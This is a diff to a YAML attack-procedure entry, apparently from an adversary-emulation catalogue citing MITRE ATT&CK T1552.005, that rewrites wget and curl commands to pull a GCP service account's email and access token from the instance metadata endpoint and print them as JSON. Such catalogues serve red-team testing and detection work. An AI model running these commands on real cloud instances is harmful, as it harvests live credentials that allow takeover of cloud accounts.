@@ -10,13 +10,19 @@ procedures:
   - key: wget
     tool: wget
     command: >-
-      wget -qO- http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 
-      --header="Metadata-Flavor: Google"
-  - key: GCP
+      EMAIL=$(wget -qO- http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email 
+        --header="Metadata-Flavor: Google") &&
+      TOKEN=$(wget -qO- http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 
+        --header="Metadata-Flavor: Google") &&
+      echo {\"email\": \"$EMAIL\", \"token\": $TOKEN}
+  - key: curl
     tool: curl
     command: >-
-      curl http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 
-      -H "Metadata-Flavor: Google"
+      EMAIL=$(curl http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email 
+      -H "Metadata-Flavor: Google") &&
+      TOKEN=$(curl http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 
+      -H "Metadata-Flavor: Google") &&
+      echo {\"email\": \"$EMAIL\", \"token\": $TOKEN}
 effects: ["GCP.serviceAccountToken"]
 references:
   - https://attack.mitre.org/techniques/T1552/005/
